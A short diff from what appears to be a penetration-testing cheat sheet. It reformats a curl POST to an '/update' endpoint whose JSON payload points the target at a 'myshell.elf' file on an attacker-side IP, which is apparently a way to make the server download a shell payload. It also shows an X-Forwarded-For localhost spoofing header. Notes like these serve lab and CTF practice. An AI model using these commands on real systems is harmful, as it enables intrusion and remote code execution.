@@ -247,8 +247,7 @@ git push origin master
 > 1. ```bash X-Forwarded-For: localhost ```
 	
 ### CURL via POST
-> 1. ```bash curl -XPOST http://192.168.198.134:13337/update -H 'Content-Type: application/json' -d '{"user":"test","url":"http://192.168.49.19
-8:22/myshell.elf"}'```
+> 1. ```bash curl -XPOST http://192.168.198.134:13337/update -H 'Content-Type: application/json' -d '{"user":"test","url":"http://192.168.49.198:22/myshell.elf"}' ```
 > 1. in BurpSuite
 ```bash
 POST /update HTTP/1.1
